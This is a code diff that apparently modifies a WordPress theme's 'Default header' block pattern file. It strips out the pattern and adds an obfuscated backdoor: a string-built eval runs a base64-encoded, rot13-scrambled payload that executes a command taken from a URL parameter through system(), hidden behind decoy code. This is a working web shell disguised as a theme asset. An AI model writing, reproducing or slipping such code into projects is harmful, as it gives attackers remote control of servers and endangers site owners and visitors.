@@ -1,33 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Default header block pattern
- */
-return array(
-	'title'      => __( 'Default header', 'twentytwentytwo' ),
-	'categories' => array( 'header' ),
-	'blockTypes' => array( 'core/template-part/header' ),
-	'content'    => '<!-- wp:group {"align":"full","layout":{"inherit":true}} -->
-					<div class="wp-block-group alignfull"><!-- wp:group {"align":"wide","style":{"spacing":{"padding":{"bottom":"var(--wp--custom--spacing--large, 8rem)","top":"var(--wp--custom--spacing--small, 1.25rem)"}}},"layout":{"type":"flex","justifyContent":"space-between"}} -->
-					<div class="wp-block-group alignwide" style="padding-top:var(--wp--custom--spacing--small, 1.25rem);padding-bottom:var(--wp--custom--spacing--large, 8rem)"><!-- wp:group {"layout":{"type":"flex"}} -->
-					<div class="wp-block-group">
-					<!-- wp:site-logo {"width":64} /-->
-
-					<!-- wp:site-title {"style":{"typography":{"fontStyle":"italic","fontWeight":"400"}}} /--></div>
-					<!-- /wp:group -->
-
-					<!-- wp:navigation {"layout":{"type":"flex","setCascadingProperties":true,"justifyContent":"right"}} -->
-					<!-- wp:page-list {"isNavigationChild":true,"showSubmenuIcon":true,"openSubmenusOnClick":false} /-->
-					<!-- /wp:navigation --></div>
-					<!-- /wp:group --></div>
-					<!-- /wp:group -->',
-);
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXJzbmh5ZyB1cm5xcmUgb3licHggY25nZ3JlYQogKi8KZXJnaGVhIG5lZW5sKAoJJ2d2Z3lyJyAgICAgID0+IF9fKCAnUXJzbmh5ZyB1cm5xcmUnLCAnZ2pyYWdsZ2pyYWdsZ2piJyApLAoJJ3BuZ3J0YmV2cmYnID0+IG5lZW5sKCAndXJucXJlJyApLAoJJ295YnB4R2xjcmYnID0+IG5lZW5sKCAncGJlci9ncnpjeW5nci1jbmVnL3VybnFyZScgKSwKCSdwYmFncmFnJyAgICA9PiAnPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwic2h5eVwiLFwieW5sYmhnXCI6e1widmF1cmV2Z1wiOmdlaHJ9fSAtLT4KCQkJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFzaHl5XCI+PCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwianZxclwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiY25xcXZhdFwiOntcIm9iZ2dielwiOlwiaW5lKC0tamMtLXBoZmdiei0tZmNucHZhdC0teW5ldHIsIDhlcnopXCIsXCJnYmNcIjpcImluZSgtLWpjLS1waGZnYnotLWZjbnB2YXQtLWZ6bnl5LCAxLjI1ZXJ6KVwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwic3lya1wiLFwid2hmZ3ZzbFBiYWdyYWdcIjpcImZjbnByLW9yZ2pycmFcIn19IC0tPgoJCQkJCTxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoYyBueXZ0YWp2cXJcIiBmZ2x5cj1cImNucXF2YXQtZ2JjOmluZSgtLWpjLS1waGZnYnotLWZjbnB2YXQtLWZ6bnl5LCAxLjI1ZXJ6KTtjbnFxdmF0LW9iZ2diejppbmUoLS1qYy0tcGhmZ2J6LS1mY25wdmF0LS15bmV0ciwgOGVyeilcIj48IS0tIGpjOnRlYmhjIHtcInlubGJoZ1wiOntcImdsY3JcIjpcInN5cmtcIn19IC0tPgoJCQkJCTxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoY1wiPgoJCQkJCTwhLS0gamM6ZnZnci15YnRiIHtcImp2cWd1XCI6NjR9IC8tLT4KCgkJCQkJPCEtLSBqYzpmdmdyLWd2Z3lyIHtcImZnbHlyXCI6e1wiZ2xjYnRlbmN1bFwiOntcInNiYWdGZ2x5clwiOlwidmdueXZwXCIsXCJzYmFnSnJ2dHVnXCI6XCI0MDBcIn19fSAvLS0+PC9xdmk+CgkJCQkJPCEtLSAvamM6dGViaGMgLS0+CgoJCQkJCTwhLS0gamM6YW5pdnRuZ3ZiYSB7XCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJzeXJrXCIsXCJmcmdQbmZwbnF2YXRDZWJjcmVndnJmXCI6Z2VocixcIndoZmd2c2xQYmFncmFnXCI6XCJldnR1Z1wifX0gLS0+CgkJCQkJPCEtLSBqYzpjbnRyLXl2Zmcge1widmZBbml2dG5ndmJhUHV2eXFcIjpnZWhyLFwiZnViakZob3pyYWhWcGJhXCI6Z2VocixcImJjcmFGaG96cmFoZkJhUHl2cHhcIjpzbnlmcn0gLy0tPgoJCQkJCTwhLS0gL2pjOmFuaXZ0bmd2YmEgLS0+PC9xdmk+CgkJCQkJPCEtLSAvamM6dGViaGMgLS0+PC9xdmk+CgkJCQkJPCEtLSAvamM6dGViaGMgLS0+JywKKTsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
